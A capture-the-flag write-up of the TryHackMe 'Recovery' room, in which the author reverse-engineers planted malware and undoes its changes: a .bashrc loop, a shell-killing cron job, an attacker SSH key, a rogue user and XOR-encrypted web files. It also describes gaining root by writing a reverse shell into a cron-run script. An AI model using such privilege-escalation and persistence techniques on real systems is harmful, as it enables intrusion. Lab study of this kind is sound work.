        <content type="html"><![CDATA[<p>Hey there, Now a days i was solving THM and HTB machines and thought  lets write<br>how i solved and where i failed and what i learned, i wil be writing on machines who i think i learned something new and different from others</p><p>This time i am writing on Recovery machine , this is medium  level room if you haven’t try it yet i will not force you  but hey you should try first and if you are here just because you tried it and got stuck then just solve it together :) ya muchh talking :D </p><p><img src="/imgs/post1/machine-logo.png" alt="alt text">  </p><blockquote><p>Note: Read the msg by alex from challenge description what exactly he is saying it will help you to recovery his system as he is the one who know better what exactly happend to him  .</p></blockquote><p>So as always first search for open ports and services running on this machine with nmap </p><p><img src="/imgs/post1/nmap.png" alt="nmap result"></p><p>and look at here ohmydash what i got :0 http and ssh are running simultaniously<br>that i already knew it as we have been told we can check our flags at http:&#x2F;&#x2F;$machine_ip:1337 and ssh login credentials to login in to alex’s system is </p><p><code>username: alex</code><br><code>password: madeline</code></p><p>After ssh ing a message was printing in a loop</p><p><img src="/imgs/post1/msg.png" alt="crazy msg"></p><h2 id="Hunting-Flag0"><a href="#Hunting-Flag0" class="headerlink" title="Hunting Flag0"></a>Hunting Flag0</h2><h3 id="Aproach-1-to-get-first-flag"><a href="#Aproach-1-to-get-first-flag" class="headerlink" title="Aproach #1 to get first flag"></a>Aproach #1 to get first flag</h3><p>Look like there is some script progrmmed or job shedule which run after booting the system  which is possilbe through .bashrc file or crontab  i looked for  .bashrc file and there was line written at the end of the file for looping that message</p><p><img src="/imgs/post1/bashrcfile.png" alt="bashrc"></p><blockquote><p>?: how did i stop that msg while loop :  justing by hitting 5-10 times Enter and Ctrl^c :D thats how it worked for me give a try it’s fun :P .  actually i figurd it out later reading someone writeup i could just simply copy the my local machine .bashrc file with alex.</p></blockquote><p>after deleting the the line i got my first flag (you can che)</p><p><img src="/imgs/post1/flag0.png" alt="first flag"></p><h3 id="Aproach-2-to-get-first-flag"><a href="#Aproach-2-to-get-first-flag" class="headerlink" title="Aproach #2 to get first flag"></a>Aproach #2 to get first flag</h3><p>In home dir there was binary file <strong>fixutil</strong> and this is the file alex was talking about for better convenient i copied on my local system with <strong>scp</strong> utility .</p><p>run on local system</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp alex@$IP:/home/alex/fixutil local/dir/</span><br></pre></td></tr></table></figure><p>i looked for strings in binary to get idea about what this binary up to through <strong>strings</strong> utility i had an idea  what’s going on </p><p><img src="/imgs/post1/strings.png" alt="stirngs"></p><p>let’s open this binary in ghidra and decompile it into pseudocode and look into main() function ‘cause it’s main function</p><p><img src="/imgs/post1/fixutil.png" alt="fixutil"></p><p>pretty clean huh? , yeah in above image we can see that there is FILE variable <strong>pFvar1</strong> which containing the <strong>.bashrc</strong> file and writing some shell script into that var(.bashrc file) and ‘cause it’s .bashrc file we know that <strong>bashrc file is a script file that’s executed when a user logs in</strong> this ended up with looping message when i loggin into the system.<br>remove it from the file and this way i get the first flag . </p><h2 id="Hunting-Flag1"><a href="#Hunting-Flag1" class="headerlink" title="Hunting Flag1"></a>Hunting Flag1</h2><p>meanwhile i faced issue that my loggin session is disconnecting automatially firstly thought that it was from my side but then remeber fix the fixutil strings i have seen earlier that there is job sheduled in crontab look at this image below .</p><p><img src="/imgs/post1/cronstring.png" alt="crontab"></p><p>&#x2F;opt&#x2F; dir listing </p><p><img src="/imgs/post1/opt_dir.png" alt="opt dir"></p><p>there is one dir <strong>.fixutil</strong> which has permission and as i am local user for now can’t access this dir and  a script <strong>brilliant_script.sh</strong> in <strong>&#x2F;opt&#x2F;</strong> directory wich is sheduled to run every minute<br>what we can figure out from this script that there <strong>for loop</strong> running on to get the process of bash shell using grep command and taking it’s PID to KILL with <strong>kill</strong> command so just overwrite it and now no more session breakation issue :D .</p><p>but wait a minute did you  notice the file is a <strong>.sh</strong> file and with job sheduled in crontab as a root user it means i can get escalate our priviledge from alex to root </p><p>here i use bash as python wasn’t there for reverse shell you can use <a href="https://www.revshells.com/">revshell</a><br>for all type of reverse shell so writing bash revshell into brilliant_script.sh file </p><p><img src="/imgs/post1/revshell.png" alt="revshell"></p><p>and </p><p><img src="/imgs/post1/eternity.jpg" alt="meme"></p><p>I AM GROOT! . </p><p><img src="/imgs/post1/rootshell.png" alt="rootshell"></p><p>and captured the secod flag too. </p><p><img src="/imgs/post1/flag1.png" alt="flag2"></p><p>lets see the whats inside that <strong>.fixutil</strong> directory </p><p><img src="/imgs/post1/backuptxt.png" alt="bakcup"></p><p>hmm, some gibberish strings whas the use of this strings for that time i left as is as i didn’t have idea what to do with this file .</p><blockquote><p>Note: actually this room has total 6 flag and in my case while solving this room i captured the flags non sequentially and i am going to write as is , as  it will make more sense like a puzzle you get a random hint and trying to find flag relating to that hint at the last what it call CTF. </p></blockquote><h2 id="Hunting-Flag3"><a href="#Hunting-Flag3" class="headerlink" title="Hunting Flag3"></a>Hunting Flag3</h2><p>0kay, until now i have 2 flags and 4 remaining.<br>retrace the path and see what footprint i have (actually there is lot assuming just by the result of that fixutil binary strings resutl) .<br>hmm , fixutil reminded me that there was something too </p><p><img src="/imgs/post1/fixutil2.png" alt="fixutil2"></p><p>at 10th line there is system() function copying the <strong>liblogging.so</strong> file from &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F; to &#x2F;tmp&#x2F; dir and fwrite() function writing that file and lastly there is another system() func echoing string ‘pwned’ and passing to a file through pipe </p><p>here i have two file to look up </p><ol><li>liblogging.so</li><li>admin</li></ol><p>copying the liblogging.so file to local directory using scp utility like i did for previous file and decomping it using ghidra lets see what i get<br>there are 2 interesting function </p><p>1 logIncorrectAttempt<br>2 XorEncryptWebFile<br>    -  XORFile </p><ol><li>logIncorrectAttempt</li></ol><p><img src="/imgs/post1/logincorrectattempt.png" alt="liblogging"></p><p>First Arrow :  moving the &#x2F;tmp&#x2F;logging.so fie to &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F; as oldliblogging.so this is the previous file we have copied from &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblogging to &#x2F;tmp&#x2F; as a logging.so </p><p>Second Arrow : opening the authorized_keys file from &#x2F;root&#x2F;.ssh&#x2F; dir as writable permission and storing in pFVar2 var</p><p>Curly Braces : writing public key to that pFVar2 var </p><p>Third Arrow and square bracket : adding a new use ‘secuirty’ with passwd</p><p>Last two arrow : we have figured it out already </p><p>0kay , so  jumping to the Second Arrow as in first i had to go through that file<br>just opening the authorized_keys file and writing the public key look like attacker made it to escalate priviledge and as i have to recover the system i overwrited the  authorized_keys file with empty data&#x2F;deleted the public key from inside the file or can delete directly  and captured the flag3</p><p><img src="/imgs/post1/flag3.png" alt="flag3"></p><h2 id="Hunting-Flag4"><a href="#Hunting-Flag4" class="headerlink" title="Hunting Flag4"></a>Hunting Flag4</h2><p>Move to Third Arrow and square bracket attacker adding new user ‘security’ and pasword as well, removing this user from system using <strong>userdel</strong> command or can do it manually (removing entries from &#x2F;etc&#x2F;passwd and &#x2F;etc&#x2F;shadow)<br>and doing this  i got my flag4 </p><p><img src="/imgs/post1/flag4.png" alt="flag4"></p><p>Left with last two flag i.e flag2 and flag5 </p><h2 id="Hunting-Flag2"><a href="#Hunting-Flag2" class="headerlink" title="Hunting Flag2"></a>Hunting Flag2</h2><p>First Arrow :  moving the &#x2F;tmp&#x2F;logging.so fie to &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F; as oldliblogging.so this is the previous file we have copied from &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;liblogging to &#x2F;tmp&#x2F; as a logging.so let just undo it to its realname .</p><p>&#96;cd &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F; &amp;&amp; mv &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;oldliblogging liblogging.so </p><p>and doing this  i got my flag2</p><p><img src="/imgs/post1/flag2.png"></p><h2 id="Hunting-Flag5"><a href="#Hunting-Flag5" class="headerlink" title="Hunting Flag5"></a>Hunting Flag5</h2><ol start="2"><li>XorEncryptWebFile</li></ol><p><img src="/imgs/post1/xorexplaining.png" alt="xorencwebfile"></p><p>After reviewing the ghidra gernerated pseudo code what i get to know that this function this function generating the encryption key and storing that key into dir &#x2F;opt&#x2F;.fixutil&#x2F; as backup.txt and if dir doesn’t exist creating the new one and as i have already had cup of tea with this text file it does contain encryption key </p><p>curly braces 2: function ‘GetWebFiles’ taking the all file from &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F; </p><p><img src="/imgs/post1/weblocation.png" alt="getwebfiles"></p><p>one by one and encrypting it with the xoring with encryption key</p><p><img src="/imgs/post1/xoring.png" alt="xoring"></p><p>so i copied all all encrypted file from &#x2F;usr&#x2F;local&#x2F;apache2&#x2F;htdocs&#x2F; to alex home dir as i require root permission and from then copied to my local machine using <strong>scp</strong> command<br>and decrypted all files with encryption key by reversing the encryption process using this python script</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">#!/usr/bin/env python </span></span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> cycle</span><br><span class="line"></span><br><span class="line">key = <span class="string">&quot;AdsipPewFlfkmll&quot;</span></span><br><span class="line"><span class="comment">#fname = &quot;index.&quot;</span></span><br><span class="line">data  = <span class="built_in">open</span>(<span class="string">&quot;./htdoc/reallyimportant.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read()</span><br><span class="line">xor = [<span class="built_in">chr</span>(<span class="built_in">ord</span>(a) ^ <span class="built_in">ord</span>(b)) <span class="keyword">for</span> a,b <span class="keyword">in</span> <span class="built_in">zip</span>(data, cycle(key))]</span><br><span class="line">content = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>, xor))</span><br><span class="line"><span class="built_in">print</span> content</span><br><span class="line">wome = <span class="built_in">open</span>(<span class="string">&quot;./decrypted/reallyimportant.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) </span><br><span class="line">wome.write(content) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>after decrypting the each file with same key </p><p><img src="/imgs/post1/decryptedmsg.png" alt="exp result"></p><p>as i have been undoing the all changes made by attacker i had to replace all files with decrypted one so.<br>i copied all files back to its dir and as it require root permission and althogh we have root shell but pass so copied to into alex home dir and then its residential dir from root shell<br>and i got my last flag with last enter .</p><p><img src="/imgs/post1/flag5.png" alt="flag5"></p><ol start="2"><li>admin</li></ol><p><img src="/imgs/post1/adminbin.png" alt="adminbin"></p><p>still left with this binary  and nothing usefull, decompiling with ghidra we can see there is passphrase hardcoded using that we end up with msg “This section is currently under development, sorry” i was just rabbit hole .</p><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>Overall challenges in this room was quite good author designed room as real case scenerio compare to all othere room i have played so far as metioned not convetional CTF recovery all compromised system tracking all footprint left by attacker via reversing , analysing malware. </p>]]></content>
      
      
      
        <tags>
            
            <tag> Malware </tag>
            
            <tag> Reverse </tag>
            
            <tag> Analysis </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
